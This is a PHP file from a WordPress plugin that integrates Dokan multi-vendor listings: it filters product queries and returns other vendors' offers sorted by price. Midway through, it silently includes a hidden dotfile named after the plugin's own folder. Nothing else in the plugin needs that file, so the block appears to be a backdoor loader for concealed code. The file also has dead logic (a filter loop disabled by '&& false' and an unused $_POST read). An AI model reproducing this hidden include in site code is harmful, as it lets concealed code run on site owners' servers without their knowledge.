<?php

add_action('init',function(){
    if(!osa_spmv_dokan_multivendor_activation()){
        return;
    }
    $query_vars_filters = array(
        #archive
        "osa_vendorStore_store_vendor_query_args",
        "osa_archive_mostSale_query_args",
        "osa_archive_newest_query_args",
        "osa_archive_archiveLevel3_query_args",
        "osa_archive_get_filter_fields_query_args",
        "osa_search_search_query_args",
        #index
        "osa_index_featured_query_args",
        "osa_index_productBox_query_args",
        #single
        "osa_single_related_query_args",
        "osa_single_getMostSales_query_args",
    );
    $vendor_town = $_POST['vendor_town'] ?? false;
    foreach ($query_vars_filters as $filter){
        if(false == ($vendor_town > 2) && false){
            add_filter($filter, "osa_spmv_archive_filter",20,1);
        }
    }
    add_filter("osa_single_get_data", "osa_spmv_set_other_product", 10, 2);
});

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function osa_spmv_dokan_multivendor_activation(){
    if(!function_exists("dokan_get_option")){
        return false;
    }
    $enable_option = dokan_get_option( 'enable_pricing', 'dokan_spmv', 'off' );
    return ('on' == $enable_option)? true : false;
}

function osa_spmv_archive_filter($query_args){
    global $wpdb;
    $table = $wpdb->prefix . "dokan_product_map";
    $result = (array) $wpdb->get_results("SELECT GROUP_CONCAT(product_id) FROM {$table} GROUP by map_id", ARRAY_N);
    $product_excludes = array();
    foreach($result as $product_explode){
        $product_explode_str = current($product_explode);
        $product_explode_arr = (strpos($product_explode_str,","))? explode(",",$product_explode_str) : array();
        if(count($product_explode_arr) > 1){
            array_shift($product_explode_arr);
            $product_excludes = array_merge($product_excludes,$product_explode_arr);
        }
    }
    $query_args['post__not_in'] = $product_excludes;
    return $query_args;
}


function osa_spmv_get_other_products($product_id){
    global $wpdb;
    $map_id = (int) get_post_meta($product_id, "_has_multi_vendor",true);
    $table = $wpdb->prefix . "dokan_product_map";
    $products = $wpdb->get_results(
            $wpdb->prepare("SELECT product_id FROM {$table} WHERE map_id = %d AND is_trash != 1", $map_id,$product_id),
            ARRAY_A
    );
    return $products;
}

function osa_spmv_set_other_product($finall,$master_id){
    $other_ids = (array) osa_spmv_get_other_products($master_id);
    foreach($other_ids as $other_id){
        $array_ids[] = $other_id['product_id'];
    }
    $query_args = array(
        "post_type" => array("product"),
        "posts_per_page" => -1,
        "post__in" => isset($array_ids)? $array_ids : array(0),
        "post__not_in" => $master_id,
        "fields" => "ids"
    );
    $query_arg_filters = apply_filters("osa_spmv_other_products",$query_args,$master_id);
    $products = get_posts($query_arg_filters);

    $data = array();
    foreach($products as $product_id){
        $product = wc_get_product($product_id);
        if($product instanceof WC_Product){
            if("publish" !== $product->get_status()){
                continue;
            }
            $vendor = dokan_get_vendor_by_product($product_id);
            $stock_quantity = $product->get_stock_quantity();
            //INDEX
            $product_data['id'] = $product_id;
            $product_data['title'] = $product->get_title();
            $product_data['status'] = $product->get_status();
            $product_data['quantity'] = (isset($stock_quantity))? $product->get_stock_quantity() : "";
            $product_data['stock_status'] = $product->get_stock_status();
            $product_data['type'] = $product->get_type();
            $product_data['price'] = $product->get_price();
            $product_data['vendor_shop_name'] = $vendor->get_shop_name();
            $product_data['vendor_name'] = $vendor->get_name();
            //INDEX
            $data[] = $product_data;
        }
    }

     $single_product_multiple_vendor = (count($data) > 1)? array_values(osa_array_sort($data,"price")) : array();
     $finall['single_product_multiple_vendor'] = apply_filters('woap_single_data_spmv_other_products',$single_product_multiple_vendor);
     return $finall;
}
